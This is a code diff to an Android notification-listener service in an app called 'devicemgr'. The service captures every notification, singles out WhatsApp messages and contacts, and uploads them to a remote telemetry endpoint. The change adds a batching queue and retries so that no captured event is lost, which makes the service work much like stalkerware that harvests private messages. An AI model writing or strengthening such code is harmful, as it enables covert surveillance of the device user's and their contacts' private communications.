@@ -9,17 +9,22 @@ import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.util.Log;
 
-import com.company.devicemgr.utils.HttpClient;
+import com.company.devicemgr.utils.TelemetryDispatch;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 public class NotificationListenerSvc extends NotificationListenerService {
     private static final String TAG = "NotifListenerSvc";
     private static final String PREFS = "devicemgr_prefs";
     private static final String KEY_RECENT_WHATSAPP_CONTACTS = "recent_whatsapp_contacts";
+    private static final int NOTIFICATION_FLUSH_BATCH_SIZE = 25;
+
+    private final ExecutorService syncExecutor = Executors.newSingleThreadExecutor();
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
@@ -31,25 +36,31 @@ public class NotificationListenerSvc extends NotificationListenerService {
             JSONObject payload = buildPayload(sbn, notif, pkg);
             if (payload == null) return;
 
-            new Thread(() -> {
+            final boolean isWhatsapp = isWhatsappPackage(pkg);
+            if (isWhatsapp) rememberWhatsappContact(payload);
+
+            syncExecutor.execute(() -> {
                 try {
-                    android.content.SharedPreferences sp = getSharedPreferences(PREFS, MODE_PRIVATE);
-                    String token = sp.getString("auth_token", null);
-                    String deviceId = sp.getString("deviceId", "unknown");
-                    String url = com.company.devicemgr.utils.ApiConfig.api("/api/telemetry/" + deviceId);
-                    JSONObject body = new JSONObject();
-                    boolean isWhatsapp = isWhatsappPackage(pkg);
-                    body.put("type", isWhatsapp ? "whatsapp" : "notification");
-                    body.put("payload", payload);
-                    HttpClient.postJson(url, body.toString(), token);
-                    if (isWhatsapp) rememberWhatsappContact(payload);
+                    TelemetryDispatch.flushPendingEvents(this, NOTIFICATION_FLUSH_BATCH_SIZE);
+                    JSONObject body = TelemetryDispatch.eventBody(isWhatsapp ? "whatsapp" : "notification", payload);
+                    boolean ok = TelemetryDispatch.postEventNow(this, body);
+                    if (!ok) {
+                        TelemetryDispatch.enqueuePendingEvent(this, body);
+                    }
                 } catch (Exception e) {
                     Log.e(TAG, "notif send err", e);
                 }
-            }).start();
+            });
         } catch (Exception e) {
             Log.e(TAG, "onNotificationPosted error", e);
         }
+    }
+
+
+    @Override
+    public void onListenerConnected() {
+        super.onListenerConnected();
+        syncExecutor.execute(() -> TelemetryDispatch.flushPendingEvents(this, NOTIFICATION_FLUSH_BATCH_SIZE));
     }
 
     private JSONObject buildPayload(StatusBarNotification sbn, Notification notif, String pkg) throws Exception {
@@ -171,6 +182,13 @@ public class NotificationListenerSvc extends NotificationListenerService {
             if (value != null && value.trim().length() > 0) return value.trim();
         }
         return null;
+    }
+
+
+    @Override
+    public void onDestroy() {
+        syncExecutor.shutdown();
+        super.onDestroy();
     }
 
     @Override
